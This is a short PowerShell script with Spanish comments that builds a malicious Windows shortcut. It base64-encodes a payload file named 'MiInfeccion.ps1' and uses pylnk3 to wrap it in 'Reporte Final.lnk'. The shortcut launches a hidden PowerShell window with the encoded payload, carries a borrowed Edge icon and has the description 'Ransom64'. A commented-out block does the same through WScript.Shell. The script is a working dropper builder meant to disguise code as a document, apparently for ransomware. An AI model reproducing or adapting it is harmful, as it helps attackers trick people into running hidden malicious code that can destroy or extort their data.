$base = $PSScriptRoot+"\";
if($base -eq "\"){$base = ".\"}

$output = $base + "output\";
$payloads = $base + "payloads\";

if((Test-Path $output) -eq $false){New-Item -ItemType Directory $output}
if((Test-Path $payloads) -eq $false){New-Item -ItemType Directory $payloads}

$archivo = "MiInfeccion.ps1"
$archivo_lnk = "Reporte Final.lnk"

$cont = Get-Content $payloads$archivo;
$cont = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cont));

pylnk3 c --arguments "-WindowStyle hidden -e $cont" --icon "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --icon-index 13 --mode "Minimized" --description "Ransom64" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $output$archivo_lnk

<# Este codigo no funciona por usar API de Windows, se debe usar pylnk3
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($base+"prueba_base.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle hidden -e " + $cont
$Shortcut.IconLocation = $env:SystemRoot + "\explorer.exe"
$Shortcut.Save()
#>
